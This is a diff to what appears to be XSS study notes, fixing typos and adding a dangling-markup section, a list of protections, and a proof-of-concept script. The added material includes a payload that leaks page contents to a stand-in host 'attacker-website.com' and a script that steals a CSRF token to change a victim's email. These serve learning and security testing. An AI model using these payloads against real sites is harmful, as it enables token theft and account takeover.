@@ -2,7 +2,7 @@
 
 Cross-Site Scripting is all about getting malicious javascript to execute. This allows an attacker to do basically anything on the client-side of the targeted user. A basic test to check if XSS is working, is by invoking the `alert(1)` function. Or use `alert(document.domain)` to show what domain the javascript is executing on. 
 
-An attacker is then ablo to
+An attacker is then able to
 - Impersonate or masquerade as the victim user
 - Carry out any action that the user is able to perform
 - Read any data that the user is able to access
@@ -15,7 +15,7 @@ User input is immediatly reflected in the response in an unsafe way that allows 
 
 1. Test every entry point, input parameters, URL file path, http headers, etc
 2. Submit random alphanumeric values, and check if they are reflected
-3. Determine the reflection context, inbetween tags, in javascript string, etc
+3. Determine the reflection context, inbetween tags, in javascript string, etc. Take a look at the [Proof of Concepts](#proof-of-concepts) on how to escape certain contexts
 4. Test different payloads, [cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 5. Test the attack in browser
 
@@ -24,7 +24,7 @@ Inputted data is later used by the application in an unsafe way that allows for 
 
 1. Try to find connections between entry points (input parameters, URL file path, http headers, etc) and exit points (all http responses that are returned to a user in any situation)
 2. Do this by submitting specific values into all entry points, and monitoring if any response contains any of those values
-3. Determine the context, inbetween tags, in javascript string, etc
+3. Determine the context, inbetween tags, in javascript string, etc. Take a look at the [Proof of Concepts](#proof-of-concepts) on how to escape certain contexts
 4. Test different payloads, [cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 5. Test the attack in browser
 
@@ -59,8 +59,21 @@ Or a sink in third-party libraries/frameworks, e.g. [jQuery](https://jquery.com/
 
 To find what sources and sinks work, input random strings, and use developer tools to inspect the HTML, or use a javascript debugger. This task can be quite tedious.
 
+## Dangling Markup
+Imagine a normal XSS attack is not possible, but you can still inject some input that gets parsed in an unsafe way. Then you can sometimes perform a dangling markup attack. Use a payload like this:
 
+```html
+"><img src='//attacker-website.com?
+```
 
+This first breaks out of the parent html tag, and then uses an img tag to make a request to the attacker controlled website. But notice that the source link does not have a closing qoute. Now all characters up until some `'` get sent to the attacker controlled website. If you are lucky, this might include CSRF tokens, passwords, or something else sensitive.
+
+## Protections
+- The [Content-Security-Policy header](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) limits the effect of XSS attacks. Or even fully blocks some injected scripts to execute
+- Encoding data on output
+- Validating input on arrival
+
+These three together do a good job of protecting against XSS. Probably the most vulnerable parts of a website are places where users are allowed to input some kind of html markup. Because it is hard to blacklist every malicious attribute, and whitelisting might not cut it.
 
 ## Proof of Concepts
 
@@ -145,5 +158,19 @@ fetch('/post/comment', {
     body: data
 });
 });
+</script>
+```
+```html
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/my-account',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/my-account/change-email', true);
+    changeReq.send('csrf='+token+'&email=foo@bar.com')
+};
 </script>
 ```
